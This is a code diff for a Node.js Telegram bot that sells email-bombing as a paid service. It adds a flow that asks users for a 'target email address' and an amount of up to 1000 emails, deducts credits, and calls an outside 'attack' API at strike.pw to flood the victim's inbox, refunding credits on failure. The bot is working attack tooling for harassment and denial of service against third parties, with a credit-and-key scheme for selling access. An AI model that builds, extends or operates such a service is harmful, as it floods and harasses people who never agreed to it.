@@ -87,37 +87,112 @@ bot.onText(/\/start/, (msg) => {
 });
 
 
-// Command: /send
 bot.onText(/\/send/, (msg) => {
+    const chatId = msg.chat.id;
     const userId = msg.from.id.toString();
 
-    db.get("SELECT * FROM users WHERE id = ?", userId, (err, user) => {
+    db.get("SELECT * FROM users WHERE id = ?", [userId], (err, user) => {
         if (err) {
-            bot.sendMessage(msg.chat.id, "Error accessing your account. Please try again later.");
+            bot.sendMessage(chatId, "Error accessing your account. Please try again later.");
             return;
         }
 
         if (!user) {
-            bot.sendMessage(msg.chat.id, "Your account is not registered. Please start with /start.");
+            bot.sendMessage(chatId, "Your account is not registered. Please start with /start.");
             return;
         }
 
-        // Check if user has enough credits
-        if (user.credits <= 0) {
-            bot.sendMessage(msg.chat.id, "You do not have enough credits. Please redeem a key to get more credits.");
+        // Removed subscription check - replaced with credit system
+
+        // Check if user hasn't sent more than the daily limit of emails
+        if (user.emails_sent_today >= 1000) {
+            bot.sendMessage(chatId, "You've reached your daily limit of 1000 emails. Please wait until tomorrow.");
             return;
         }
 
-        // Check if user hasn't sent more than 2000 emails in the current day
-        if (user.emails_sent_today >= 2000) {
-            bot.sendMessage(msg.chat.id, "You've reached your daily limit of 2000 emails. Please wait until tomorrow.");
-            return;
-        }
-
-        bot.sendMessage(msg.chat.id, "Please enter the target email address:");
-        db.run("INSERT OR REPLACE INTO steps (userId, step, email_attempts) VALUES (?, 'input_email', 0)", userId);
+        bot.sendMessage(chatId, "Please enter the target email address:");
+        db.run("INSERT OR REPLACE INTO steps (userId, step, email_attempts) VALUES (?, 'input_email', 0)", [userId]);
     });
 });
+
+bot.onText(/.*/, async (msg) => {
+    const chatId = msg.chat.id;
+    const userId = msg.from.id.toString();
+    const text = msg.text;
+
+    db.get("SELECT * FROM steps WHERE userId = ?", [userId], async (err, row) => {
+        if (err || !row) return;
+
+        switch (row.step) {
+            case 'input_email':
+                if (validateEmail(text)) {
+                    bot.sendMessage(chatId, "How many emails do you want to send? (Minimum 10, Maximum 1000)");
+                    db.run("UPDATE steps SET email = ?, step = 'input_amount' WHERE userId = ?", [text, userId]);
+                } else {
+                    if (row.email_attempts >= 1) {
+                        bot.sendMessage(chatId, "Invalid email address entered twice. Process canceled.");
+                        db.run("DELETE FROM steps WHERE userId = ?", [userId]);
+                    } else {
+                        bot.sendMessage(chatId, "Invalid email address. Please enter a valid email.");
+                        db.run("UPDATE steps SET email_attempts = email_attempts + 1 WHERE userId = ?", [userId]);
+                    }
+                }
+                break;
+
+            case 'input_amount':
+                const emailAmount = parseInt(text);
+                if (!emailAmount || emailAmount < 10 || emailAmount > 1000) {
+                    bot.sendMessage(chatId, "Invalid amount entered. Please enter a value between 10 and 1000.");
+                    break;
+                }
+
+                const creditsNeeded = emailAmount; // 1 credit per email
+
+                db.get("SELECT credits FROM users WHERE id = ?", [userId], async (err, user) => {
+                    if (err || !user) {
+                        bot.sendMessage(chatId, "There was a problem retrieving your credit information.");
+                        return;
+                    }
+
+                    if (creditsNeeded > user.credits) {
+                        bot.sendMessage(chatId, "You do not have enough credits to send this many emails. Please recharge.");
+                        return;
+                    }
+
+                    db.run("UPDATE users SET credits = credits - ? WHERE id = ?", [creditsNeeded, userId], async (error) => {
+                        if (error) {
+                            bot.sendMessage(chatId, "There was a problem updating your credits. Please try again.");
+                            return;
+                        }
+
+                        // Now perform the API call to send the emails
+                        try {
+                            const url = `https://strike.pw/api/v1/public/attack?key=${process.env.STRIKE_API_KEY}&target=${encodeURIComponent(row.email)}&mode=normal&amount=${emailAmount}`;
+                            const response = await axios.get(url);
+
+                            if (response.data && !response.data.error) {
+                                bot.sendMessage(chatId, `Emails sent successfully! You have used ${creditsNeeded} credits.`);
+                            } else {
+                                db.run("UPDATE users SET credits = credits + ? WHERE id = ?", [creditsNeeded, userId]);
+                                bot.sendMessage(chatId, "Failed to send emails. Your credits have been refunded.");
+                            }
+                        } catch (error) {
+                            db.run("UPDATE users SET credits = credits + ? WHERE id = ?", [creditsNeeded, userId]);
+                            bot.sendMessage(chatId, "There was an error sending emails. Your credits have been refunded.");
+                            console.error("API Call Error:", error.message);
+                            if (error.response) {
+                                console.error("API Response:", error.response.data);
+                            }
+                        }
+                        // Whether success or failure, delete the steps to reset the process
+                        db.run("DELETE FROM steps WHERE userId = ?", [userId]);
+                    });
+                });
+                break;
+        }
+    });
+});
+
 
 // Command: /generate (Amount of Emails) (Amount of Keys to generate)
 bot.onText(/\/generate (\d+) (\d+)/, (msg, match) => {
